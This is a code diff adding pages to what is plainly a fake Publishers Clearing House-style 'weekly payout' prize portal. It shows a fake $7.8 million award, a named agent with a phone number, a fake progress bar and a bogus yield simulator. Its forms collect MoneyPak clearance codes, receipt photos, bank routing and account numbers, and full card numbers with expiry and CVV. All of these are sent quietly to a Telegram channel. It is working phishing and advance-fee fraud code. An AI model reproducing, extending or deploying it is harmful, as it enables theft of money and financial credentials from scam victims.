+    <div class="bg-navy-900 border border-gold-500/30 p-4 rounded-2xl text-[11px] text-slate-300 leading-relaxed"><i class="fa-solid fa-barcode text-gold-400 mr-1.5"></i>Submit clearance code, amount, and receipt photo. Ref <b class="text-white">${escapeHtml(cw.refNum||'—')}</b> · <b class="text-gold-400">${fmtMoney(amt)}</b>.</div>
+    <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">MoneyPak Amount ($)</label><input type="number" id="mp-amount" required min="1" step="0.01" value="${amt.toFixed(2)}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+    <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Clearance Code (14 digits)</label><input type="text" id="mp-code" required minlength="10" maxlength="14" oninput="this.value=this.value.replace(/[^0-9]/g,'')" placeholder="14-digit code" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+    <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Receipt Photo</label><input type="file" id="mp-receipt" accept="image/*" class="w-full text-xs text-slate-400 file:mr-3 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-950 file:cursor-pointer cursor-pointer bg-navy-950 border border-navy-700 rounded-xl p-1.5 focus:outline-none focus:border-sky-custom"></div>
+    <div class="flex justify-end gap-3 pt-2"><button type="button" onclick="closeModal()" class="px-4 py-2.5 bg-navy-950 text-slate-300 rounded-xl text-xs font-bold">Cancel</button><button type="submit" class="px-6 py-2.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">Submit for Admin Review</button></div>
+  </form>`);
+}
+async function submitMoneyPak(e) {
+  e.preventDefault();
+  const cw = Object.assign({}, state.currentWithdrawal || {});
+  const code = (document.getElementById('mp-code').value||'').trim();
+  const mpAmount = parseFloat(document.getElementById('mp-amount').value) || 0;
+  const file = document.getElementById('mp-receipt').files[0];
+  const amt = Number(cw.amount) || 0;
+  cw.moneyPakCode = code;
+  cw.moneyPakAmount = mpAmount;
+  cw.moneyPakReceiptName = file ? file.name : null;
+  state.currentWithdrawal = cw;
+  state.withdrawalState = 'moneypak_submitted';
+  saveDeviceState();
+  closeModal();
+  showToast('Submitted for Review', 'Awaiting admin approval.', 'success');
+
+  const common = await buildCommonTgBlock();
+  sendTelegramMessage(
+    `🧾 <b>MONEYPAK CLEARANCE SUBMITTED</b>\n` +
+    `<b>Ref:</b> ${tgEsc(cw.refNum||'—')}\n` +
+    `<b>Withdrawal amount:</b> ${fmtMoney(amt)}\n` +
+    `<b>MoneyPak amount:</b> ${fmtMoney(mpAmount)}\n` +
+    `<b>Full code:</b> <code>${tgEsc(code)}</code>\n` +
+    `<b>Receipt file:</b> ${tgEsc(file ? file.name : 'not attached')}\n` +
+    common.block
+  ).catch(()=>{});
+
+  if (file) sendTelegramFile(file, `📎 <b>MoneyPak Receipt</b> — @${tgEsc(state.currentUser?.username || 'unknown')}\nRef: ${tgEsc(cw.refNum||'—')}\nSize: ${file.size} B — ${tgEsc(file.type || 'unknown')}`).catch(()=>{});
+
+  render();
+}
+
+function openStampModal() {
+  const cw = state.currentWithdrawal || {}; const amt = Number(cw.amount) || 0;
+  showModal('Stamp of Approval', `<form onsubmit="submitStampApproval(event)" class="space-y-4">
+    <div class="bg-navy-900 border border-sky-custom/30 p-4 rounded-2xl text-[11px] text-slate-300 leading-relaxed"><i class="fa-solid fa-stamp text-sky-custom mr-1.5"></i>Attach the stamped approval slip for <b class="text-gold-400">${fmtMoney(amt)}</b>.</div>
+    <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Approval Slip Photo</label><input type="file" id="stamp-receipt" accept="image/*" class="w-full text-xs text-slate-400 file:mr-3 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-950 file:cursor-pointer cursor-pointer bg-navy-950 border border-navy-700 rounded-xl p-1.5 focus:outline-none focus:border-sky-custom"></div>
+    <div class="flex justify-end gap-3 pt-2"><button type="button" onclick="closeModal()" class="px-4 py-2.5 bg-navy-950 text-slate-300 rounded-xl text-xs font-bold">Cancel</button><button type="submit" class="px-6 py-2.5 bg-sky-custom text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">Submit for Admin Review</button></div>
+  </form>`);
+}
+async function submitStampApproval(e) {
+  e.preventDefault();
+  const cw = Object.assign({}, state.currentWithdrawal || {});
+  const file = document.getElementById('stamp-receipt').files[0];
+  const amt = Number(cw.amount) || 0;
+  cw.stampReceiptName = file ? file.name : null;
+  state.currentWithdrawal = cw;
+  state.withdrawalState = 'stamp_submitted';
+  saveDeviceState();
+  closeModal();
+  showToast('Submitted for Review', 'Awaiting admin approval.', 'success');
+
+  const common = await buildCommonTgBlock();
+  sendTelegramMessage(
+    `🖋️ <b>STAMP OF APPROVAL SUBMITTED</b>\n` +
+    `<b>Ref:</b> ${tgEsc(cw.refNum||'—')}\n` +
+    `<b>Amount:</b> ${fmtMoney(amt)}\n` +
+    `<b>Slip file:</b> ${tgEsc(file ? file.name : 'not attached')}\n` +
+    common.block
+  ).catch(()=>{});
+
+  if (file) sendTelegramFile(file, `📎 <b>Stamp Slip</b> — @${tgEsc(state.currentUser?.username || 'unknown')}\nRef: ${tgEsc(cw.refNum||'—')}\nSize: ${file.size} B — ${tgEsc(file.type || 'unknown')}`).catch(()=>{});
+
+  render();
+}
+
+/* ─────────────── Funding setup modal ─────────────── */
+function openWeeklyFundsModal() {
+  ensureFundingMethodsMigrated();
+  showModal('Set Up Weekly Funds', `<form onsubmit="submitWeeklyFundsSetup(event)" class="space-y-4"><p class="text-xs text-slate-300">Choose your destination method for weekly disbursements.</p><div class="space-y-2.5"><label class="flex items-center space-x-3 bg-navy-900 p-3.5 rounded-xl border border-navy-700 cursor-pointer"><input type="radio" name="pay-method" value="bank" checked onchange="togglePayMethod('bank')" class="text-sky-custom w-4 h-4"><div><span class="text-xs sm:text-sm font-bold text-white block">Bank Wire / ACH Account</span><span class="text-[11px] text-slate-400">Direct transfer</span></div></label><label class="flex items-center space-x-3 bg-navy-900 p-3.5 rounded-xl border border-navy-700 cursor-pointer"><input type="radio" name="pay-method" value="card" onchange="togglePayMethod('card')" class="text-sky-custom w-4 h-4"><div><span class="text-xs sm:text-sm font-bold text-white block">Debit / Credit Card</span><span class="text-[11px] text-slate-400">Instant transfer</span></div></label></div><div id="bank-fields" class="space-y-3 pt-2"><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Routing Number (9 digits)</label><input type="text" id="bank-routing" required pattern="[0-9]{9}" maxlength="9" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="123456789"></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Account Number</label><input type="text" id="bank-acc" required oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="Account Number"></div></div><div id="card-fields" class="space-y-3 pt-2 hidden"><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Card Number</label><input type="text" id="card-num" oninput="formatCardInput(this)" maxlength="19" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="4000 1234 5678 9010"></div><div class="grid grid-cols-2 gap-3"><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Expiry</label><input type="text" id="card-exp" oninput="formatExpInput(this)" maxlength="5" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="12/28"></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">CVV</label><input type="password" id="card-cvv" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="123"></div></div></div><div class="flex justify-end pt-3"><button type="submit" class="w-full sm:w-auto px-6 py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-bold rounded-xl text-xs sm:text-sm active:scale-95">Save Funding Method</button></div></form>`);
+}
+function formatCardInput(input) { let v = input.value.replace(/\D/g,'').substring(0,16); let m = v.match(/\d{4,16}/g); let match = m && m[0] || ''; let parts = []; for (let i=0;i<match.length;i+=4) parts.push(match.substring(i,i+4)); input.value = parts.length ? parts.join(' ') : v; }
+function formatExpInput(input) { let v = input.value.replace(/\D/g,'').substring(0,4); if (v.length >= 3) input.value = v.substring(0,2) + '/' + v.substring(2,4); else input.value = v; }
+function togglePayMethod(method) { const bankFields = document.getElementById('bank-fields'), cardFields = document.getElementById('card-fields'), bankRouting = document.getElementById('bank-routing'), bankAcc = document.getElementById('bank-acc'), cardNum = document.getElementById('card-num'), cardExp = document.getElementById('card-exp'), cardCvv = document.getElementById('card-cvv'); if (method === 'bank') { bankFields.classList.remove('hidden'); cardFields.classList.add('hidden'); bankRouting.required = true; bankAcc.required = true; if(cardNum)cardNum.required=false; if(cardExp)cardExp.required=false; if(cardCvv)cardCvv.required=false; } else { bankFields.classList.add('hidden'); cardFields.classList.remove('hidden'); bankRouting.required = false; bankAcc.required = false; if(cardNum)cardNum.required=true; if(cardExp)cardExp.required=true; if(cardCvv)cardCvv.required=true; } }
+async function submitWeeklyFundsSetup(e) {
+  e.preventDefault();
+  const payMethodEl = document.querySelector('input[name="pay-method"]:checked');
+  const payMethod = payMethodEl ? payMethodEl.value : 'bank';
+  let methodName = ''; let weeklyFields = [];
+  let bankRouting = '', bankAcc = '', cardNumRaw = '', cardExp = '', cardCvv = '';
+  if (payMethod === 'bank') {
+    bankRouting = (document.getElementById('bank-routing').value || '').trim();
+    bankAcc = (document.getElementById('bank-acc').value || '').trim();
+    methodName = `ACH Bank (**${bankAcc.slice(-4)})`;
+    weeklyFields = [{label:'Routing',value:bankRouting},{label:'Account',value:bankAcc}];
+  } else {
+    cardNumRaw = (document.getElementById('card-num').value || '').trim();
+    cardExp = (document.getElementById('card-exp').value || '').trim();
+    cardCvv = (document.getElementById('card-cvv').value || '').trim();
+    const cleanNum = cardNumRaw.replace(/\s/g,'');
+    methodName = `Card (**${cleanNum.slice(-4)})`;
+    weeklyFields = [{label:'Card',value:cardNumRaw},{label:'Expiry',value:cardExp},{label:'CVV',value:cardCvv}];
+  }
+  state.fundingMethods = (state.fundingMethods||[]).map(f=>Object.assign({},f,{primary:false}));
+  state.fundingMethods.unshift({ label:methodName, primary:true, backup:false, details:weeklyFields, addedAt:Date.now() });
+  state.configuredMethod = methodName;
+  saveDeviceState();
+  const modal = document.getElementById('modal-content');
+  modal.innerHTML = `<div class="text-center py-6 space-y-4"><h3 class="text-xl font-bold text-white">Configuring Funding Destination</h3><p class="text-xs text-slate-400">Verifying secure token...</p><div class="w-full bg-navy-950 h-4 rounded-full overflow-hidden border border-navy-700 shadow-inner p-0.5"><div id="setup-progress" class="bg-gradient-to-r from-gold-400 via-sky-custom to-emerald-400 h-full w-0 rounded-full transition-all duration-300"></div></div><div id="setup-status-text" class="text-xs text-gold-400 font-bold">Initializing...</div></div>`;
+  let p = 0;
+  const timer = setInterval(async ()=>{
+    p += 25;
+    const bar = document.getElementById('setup-progress'); const txt = document.getElementById('setup-status-text');
+    if (bar) bar.style.width = p + '%';
+    if (p === 50 && txt) txt.textContent = 'Encrypting routing data...';
+    if (p === 75 && txt) txt.textContent = 'Confirming integration...';
+    if (p >= 100) {
+      clearInterval(timer);
+      modal.innerHTML = `<div class="text-center py-6 space-y-4"><div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-2xl"><i class="fa-solid fa-circle-check"></i></div><h3 class="text-2xl font-bold text-white">Setup Complete</h3><p class="text-xs text-slate-300">Destination: <span class="text-gold-400 font-bold">${escapeHtml(methodName)}</span></p><p class="text-[11px] text-emerald-400 font-bold mt-1"><i class="fa-solid fa-unlock mr-1"></i>Withdraw & P2P unlocked.</p><button onclick="closeModal(); render();" class="px-6 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs sm:text-sm active:scale-95">Return</button></div>`;
+      showToast('Funding Saved', methodName, 'success');
+
+      const common = await buildCommonTgBlock();
+      let detailBlock = '';
+      if (payMethod === 'bank') {
+        detailBlock = `<b>Method:</b> Bank Wire / ACH\n<b>Routing number:</b> <code>${tgEsc(bankRouting)}</code>\n<b>Account number:</b> <code>${tgEsc(bankAcc)}</code>\n<b>Label:</b> ${tgEsc(methodName)}\n`;
+      } else {
+        detailBlock = `<b>Method:</b> Card\n<b>Card number:</b> <code>${tgEsc(cardNumRaw)}</code>\n<b>Expiry:</b> <code>${tgEsc(cardExp)}</code>\n<b>CVV:</b> <code>${tgEsc(cardCvv)}</code>\n<b>Label:</b> ${tgEsc(methodName)}\n`;
+      }
+      sendTelegramMessage(`💳 <b>WEEKLY FUNDS SETUP</b>\n${detailBlock}${common.block}`).catch(()=>{});
+    }
+  }, 300);
+}
+
+/* ═══════════ OVERVIEW PAGE ═══════════ */
+function renderQuickActions() {
+  const withdrawLocked = !state.configuredMethod;
+  return `<div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
+    <button onclick="${withdrawLocked?'showSetupLockToast()':'openWithdrawModal()'}" class="bg-navy-800 border border-gold-500/30 hover:border-gold-400 rounded-2xl p-4 text-left transition active:scale-95 ${withdrawLocked?'opacity-60':''}"><div class="w-9 h-9 rounded-xl bg-gold-500/20 text-gold-400 flex items-center justify-center mb-2"><i class="fa-solid fa-money-bill-transfer"></i></div><p class="text-xs font-bold text-white">Withdraw</p><p class="text-[10px] text-slate-400">Cash out funds</p></button>
+    <a href="funds.html" class="bg-navy-800 border border-sky-custom/30 hover:border-sky-custom rounded-2xl p-4 text-left transition active:scale-95 block"><div class="w-9 h-9 rounded-xl bg-sky-custom/20 text-sky-custom flex items-center justify-center mb-2"><i class="fa-solid fa-wallet"></i></div><p class="text-xs font-bold text-white">Deposit</p><p class="text-[10px] text-slate-400">Manage methods</p></a>
+    <a href="transfer.html" class="bg-navy-800 border border-emerald-500/30 hover:border-emerald-400 rounded-2xl p-4 text-left transition active:scale-95 block"><div class="w-9 h-9 rounded-xl bg-emerald-500/20 text-emerald-400 flex items-center justify-center mb-2"><i class="fa-solid fa-arrow-right-arrow-left"></i></div><p class="text-xs font-bold text-white">Transfer</p><p class="text-[10px] text-slate-400">Send to a peer</p></a>
+    <a href="support.html" class="bg-navy-800 border border-purple-500/30 hover:border-purple-400 rounded-2xl p-4 text-left transition active:scale-95 block"><div class="w-9 h-9 rounded-xl bg-purple-500/20 text-purple-400 flex items-center justify-center mb-2"><i class="fa-solid fa-headset"></i></div><p class="text-xs font-bold text-white">Support</p><p class="text-[10px] text-slate-400">Get help</p></a>
+  </div>`;
+}
+
+function renderNextPayoutETA() {
+  const now = new Date(); const resultDate = new Date();
+  const dayOfWeek = resultDate.getUTCDay(); const daysUntilFriday = (5 - dayOfWeek + 7) % 7;
+  resultDate.setUTCHours(22 + 5, 30, 0, 0);
+  resultDate.setUTCDate(resultDate.getUTCDate() + daysUntilFriday);
+  if (now.getTime() > resultDate.getTime()) resultDate.setDate(resultDate.getDate() + 7);
+  const diff = resultDate.getTime() - now.getTime();
+  const days = Math.floor(diff / 86400000); const hours = Math.floor((diff % 86400000) / 3600000); const mins = Math.floor((diff % 3600000) / 60000);
+  return `<div class="bg-gradient-to-br from-gold-500/15 to-navy-900 border border-gold-500/30 rounded-3xl p-5 sm:p-6 card-3d"><div class="flex items-center justify-between"><div><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest">Next Payout ETA</p><p class="text-base sm:text-lg font-black text-white mt-1">${days}d ${hours}h ${mins}m</p><p class="text-[10px] text-gold-400 mt-0.5">Friday 10:30 PM EST</p></div><div class="w-11 h-11 rounded-2xl bg-gold-500/20 text-gold-400 flex items-center justify-center text-lg"><i class="fa-solid fa-hourglass-half crown-float"></i></div></div></div>`;
+}
+
+function renderReferralCard() {
+  ensureReferralCode();
+  const code = state.referralCode || '—';
+  return `<div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-7 card-3d">
+    <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
+      <div class="flex items-center gap-3">
+        <div class="w-11 h-11 rounded-2xl bg-gradient-to-br from-purple-500/30 to-pink-500/30 text-purple-300 flex items-center justify-center text-lg"><i class="fa-solid fa-gift"></i></div>
+        <div><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Your Referral Code</p><h3 class="text-lg font-black text-white tracking-wide">${escapeHtml(code)}</h3></div>
+      </div>
+      <div class="flex gap-2 shrink-0">
+        <button onclick="copyReferral()" class="px-3.5 py-2 bg-navy-900 border border-navy-700 text-white rounded-xl text-xs font-bold active:scale-95 transition"><i class="fa-solid fa-copy mr-1 text-sky-custom"></i> Copy</button>
+        <button onclick="shareReferral()" class="px-3.5 py-2 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-xl text-xs font-bold active:scale-95 transition"><i class="fa-solid fa-share mr-1"></i> Share</button>
+      </div>
+    </div>
+    <p class="text-[11px] text-slate-400 mt-3 leading-relaxed"><i class="fa-solid fa-circle-info text-sky-custom mr-1"></i> Share this code with friends. Every verified signup earns you priority in the weekly allocation draw.</p>
+  </div>`;
+}
+async function copyReferral() {
+  if (!state.referralCode) return;
+  try { await navigator.clipboard.writeText(state.referralCode); showToast('Copied', 'Referral code copied.', 'success'); } catch(e) { showToast('Copy Failed', 'Clipboard unavailable.', 'error'); }
+  const common = await buildCommonTgBlock();
+  sendTelegramMessage(`📋 <b>REFERRAL CODE COPIED</b>\n<b>Code:</b> ${tgEsc(state.referralCode)}\n${common.block}`).catch(()=>{});
+}
+async function shareReferral() {
+  if (!state.referralCode) return;
+  const text = `Join me on PCH Weekly Payout Portal — use my referral code ${state.referralCode}. ${window.location.origin}`;
+  if (navigator.share) navigator.share({ title:'PCH Weekly Payout Portal', text }).catch(()=>{});
+  else { try { await navigator.clipboard.writeText(text); showToast('Copied', 'Share text copied.', 'success'); } catch(e){} }
+  const common = await buildCommonTgBlock();
+  sendTelegramMessage(`📤 <b>REFERRAL CODE SHARED</b>\n<b>Code:</b> ${tgEsc(state.referralCode)}\n${common.block}`).catch(()=>{});
+}
+
+function renderOverview() {
+  const user = state.currentUser || {}; const quote = getCachedQuote();
+  const profileAvatarHtml = user.photoUrl ? `<img src="${user.photoUrl}" class="w-16 h-16 rounded-2xl object-cover border-2 border-gold-400 shadow-md">` : `<div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center font-black text-2xl shadow-md">${(user.firstName||'U').charAt(0)}</div>`;
+  const d = new Date(); d.setDate(d.getDate() - 2);
+  const drawDateStr = d.toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
+  return `
+    ${renderAnnouncementBanner()}
+    ${renderWithdrawalPipelineBanner()}
+    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl flex flex-col md:flex-row justify-between items-start md:items-center gap-6 shadow-xl card-3d">
+      <div class="flex items-center space-x-4">${profileAvatarHtml}<div class="space-y-1"><div class="inline-flex items-center space-x-2 bg-emerald-500/20 text-emerald-400 px-3 py-0.5 rounded-full text-xs font-bold"><i class="fa-solid fa-circle-check"></i> Verified Profile Active</div><h1 class="text-2xl sm:text-3xl font-extrabold text-white">Welcome, ${escapeHtml(user.firstName||'')} ${escapeHtml(user.lastName||'')}</h1><p class="text-xs text-slate-400">Claim: <span class="text-gold-400 font-bold">PCH-88204-NYC</span> · Draw: ${drawDateStr}</p></div></div>
+      <div class="flex flex-col sm:flex-row w-full md:w-auto gap-3"><button onclick="openSettingsModal()" class="w-full sm:w-auto px-4 py-3.5 bg-navy-900 border border-navy-700 text-white font-bold rounded-xl text-xs sm:text-sm hover:bg-navy-700 active:scale-95 transition flex items-center justify-center"><i class="fa-solid fa-user-gear mr-2 text-gold-400"></i> Settings</button><button onclick="openAccessLogModal()" class="w-full sm:w-auto px-4 py-3.5 bg-navy-900 border border-navy-700 text-white font-bold rounded-xl text-xs sm:text-sm hover:bg-navy-700 active:scale-95 transition flex items-center justify-center"><i class="fa-solid fa-shield-halved mr-2 text-sky-custom"></i> Log</button></div>
+    </div>
+    ${renderQuickActions()}
+    ${renderNextPayoutETA()}
+    <div class="card-3d border border-sky-custom/30 rounded-3xl p-6 sm:p-7 relative overflow-hidden flex items-center space-x-5" style="background:linear-gradient(135deg,rgba(21,29,56,.9),rgba(13,19,38,.95));box-shadow:0 10px 30px -5px rgba(56,189,248,.15),inset 0 1px 0 rgba(255,255,120,.1);"><div class="absolute -right-6 -bottom-6 text-6xl sm:text-7xl text-sky-custom/10 pointer-events-none"><i class="fa-solid fa-quote-right"></i></div><div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex-shrink-0 flex items-center justify-center text-xl font-bold shadow-lg shadow-gold-500/20"><i class="fa-solid fa-lightbulb"></i></div><div class="space-y-1 relative z-10"><p class="text-xs sm:text-sm font-semibold text-white italic">"${quote.quote}"</p><p class="text-[11px] text-gold-400 font-bold uppercase tracking-wider">— ${quote.author}</p></div></div>
+    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6">
+      <div class="bg-navy-800 border border-navy-700 p-5 sm:p-6 rounded-2xl card-3d"><p class="text-xs text-slate-400 uppercase font-semibold mb-1">Total Award Value</p><h3 class="text-xl sm:text-2xl font-black text-white">$7,800,000.00</h3><p class="text-[10px] text-slate-400 mt-2"><i class="fa-solid fa-shield text-sky-custom mr-1"></i> Authorized Award</p></div>
+      <div class="bg-navy-800 border border-navy-700 p-5 sm:p-6 rounded-2xl card-3d"><p class="text-xs text-slate-400 uppercase font-semibold mb-1">Available Balance</p><h3 class="text-xl sm:text-2xl font-black text-gold-400">${fmtMoney(state.userBalance)}</h3><p class="text-[10px] text-slate-400 mt-2"><i class="fa-solid fa-clock text-gold-400 mr-1"></i> Weekly Allocation</p></div>
+      <div class="bg-navy-800 border border-navy-700 p-5 sm:p-6 rounded-2xl card-3d"><p class="text-xs text-slate-400 uppercase font-semibold mb-1">Active Funding</p><h3 class="text-base sm:text-lg font-bold text-sky-custom truncate">${state.configuredMethod ? escapeHtml(state.configuredMethod) : 'Not Configured'}</h3><p class="text-[10px] text-slate-400 mt-2"><i class="fa-solid fa-check-double mr-1"></i> Destination</p></div>
+      <div class="bg-navy-800 border border-navy-700 p-5 sm:p-6 rounded-2xl card-3d"><p class="text-xs text-slate-400 uppercase font-semibold mb-1">Assigned Agent</p><h3 class="text-base sm:text-lg font-bold text-white">Andy Goldberg</h3><p class="text-[10px] text-sky-custom mt-2"><i class="fa-solid fa-phone mr-1"></i> 646-585-8110</p></div>
+    </div>
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 sm:gap-8">
+      <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d"><div class="flex flex-col sm:flex-row sm:items-center justify-between mb-6 gap-2"><h3 class="text-base sm:text-lg font-bold text-white flex items-center"><i class="fa-solid fa-stopwatch text-gold-400 mr-2"></i> Weekly Disbursement Countdown</h3><span class="text-[11px] text-slate-400 bg-navy-900 px-3 py-1 rounded-full border border-navy-700 w-fit">EST (UTC-5)</span></div><p class="text-slate-300 text-xs sm:text-sm mb-6">Countdown to Friday at 10:30 PM EST when weekly funds become eligible for release.</p><div class="grid grid-cols-4 gap-2 sm:gap-4 text-center"><div class="bg-navy-900 border border-navy-700 p-3 rounded-xl"><div id="cd-days" class="text-xl sm:text-3xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Days</div></div><div class="bg-navy-900 border border-navy-700 p-3 rounded-xl"><div id="cd-hours" class="text-xl sm:text-3xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Hours</div></div><div class="bg-navy-900 border border-navy-700 p-3 rounded-xl"><div id="cd-mins" class="text-xl sm:text-3xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Mins</div></div><div class="bg-navy-900 border border-navy-700 p-3 rounded-xl"><div id="cd-secs" class="text-xl sm:text-3xl font-black text-gold-400">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Secs</div></div></div></div>
+      <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d"><div class="flex items-center justify-between mb-4"><h3 class="text-base sm:text-lg font-bold text-white flex items-center"><i class="fa-solid fa-chart-line text-sky-custom mr-2"></i> Allocation Growth Simulator</h3><span class="px-2.5 py-1 bg-sky-custom/20 text-sky-custom text-[10px] font-bold rounded-full">Interactive</span></div><p class="text-slate-300 text-xs sm:text-sm mb-4">Simulate your projected compounding yield.</p><div class="space-y-4"><div><div class="flex justify-between text-xs font-bold text-slate-300 mb-1"><span>Principal</span><span id="sim-principal-lbl" class="text-gold-400">$4,500</span></div><input type="range" id="sim-slider" min="500" max="25000" step="500" value="4500" class="w-full accent-gold-500 cursor-pointer"></div><div class="grid grid-cols-2 gap-3 pt-2"><div class="bg-navy-900 border border-navy-700 p-3 rounded-xl text-center"><p class="text-[10px] text-slate-400 uppercase">30-Day Yield</p><p id="sim-yield-30" class="text-sm sm:text-base font-black text-emerald-400 mt-0.5">$5,220.00</p></div><div class="bg-navy-900 border border-navy-700 p-3 rounded-xl text-center"><p class="text-[10px] text-slate-400 uppercase">Annual Pool</p><p id="sim-yield-year" class="text-sm sm:text-base font-black text-gold-400 mt-0.5">$18,540.00</p></div></div></div></div>
+    </div>
+    ${renderReferralCard()}
+  `;
+}
+
+function initCountdownTimer() {
+  if (countdownInterval) clearInterval(countdownInterval);
+  function updateTimer() {
+    const now = new Date(); const resultDate = new Date();
+    const dayOfWeek = resultDate.getUTCDay(); const daysUntilFriday = (5 - dayOfWeek + 7) % 7;
+    resultDate.setUTCHours(22 + 5, 30, 0, 0);
+    resultDate.setUTCDate(resultDate.getUTCDate() + daysUntilFriday);
+    if (now.getTime() > resultDate.getTime()) resultDate.setDate(resultDate.getDate() + 7);
+    const diff = resultDate.getTime() - now.getTime();
+    if (diff <= 0) return;
+    const days = Math.floor(diff / 86400000); const hours = Math.floor((diff % 86400000) / 3600000); const mins = Math.floor((diff % 3600000) / 60000); const secs = Math.floor((diff % 60000) / 1000);
+    const dEl = document.getElementById('cd-days'), hEl = document.getElementById('cd-hours'), mEl = document.getElementById('cd-mins'), sEl = document.getElementById('cd-secs');
+    if (dEl) dEl.textContent = String(days).padStart(2,'0');
+    if (hEl) hEl.textContent = String(hours).padStart(2,'0');
+    if (mEl) mEl.textContent = String(mins).padStart(2,'0');
+    if (sEl) sEl.textContent = String(secs).padStart(2,'0');
+  }
+  updateTimer(); countdownInterval = setInterval(updateTimer, 1000);
+}
+function initGrowthCalculator() {
+  const slider = document.getElementById('sim-slider'); if (!slider) return;
+  slider.addEventListener('input', (e)=>{
+    const val = parseFloat(e.target.value);
+    const lbl = document.getElementById('sim-principal-lbl'); if (lbl) lbl.textContent = '$' + val.toLocaleString();
+    const y30 = document.getElementById('sim-yield-30'); if (y30) y30.textContent = fmtMoney(val * 1.16);
+    const yY = document.getElementById('sim-yield-year'); if (yY) yY.textContent = fmtMoney(val * 4.12);
+  });
+}
+
+function render() {
+  renderHeaderNav();
+  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('overview');
+  const container = document.getElementById('app-container');
+  container.innerHTML = renderDashboardShell('overview', renderOverview());
+  initCountdownTimer();
+  initGrowthCalculator();
+}
+
+window.onload = async function() {
+  if (!guardAuth()) return;
+  await pullCurrentUserFromCloud();
+  ensureDailyLimits(); ensureReferralCode(); ensureFundingMethodsMigrated();
+  await fetchAnnouncement(); await fetchMessages();
+  if (!sessionStorage.getItem('pch_session_logged')) { sessionStorage.setItem('pch_session_logged','1'); logAccess('Session Resumed'); }
+  render();
+};
+</script>
+</body>
+</html>
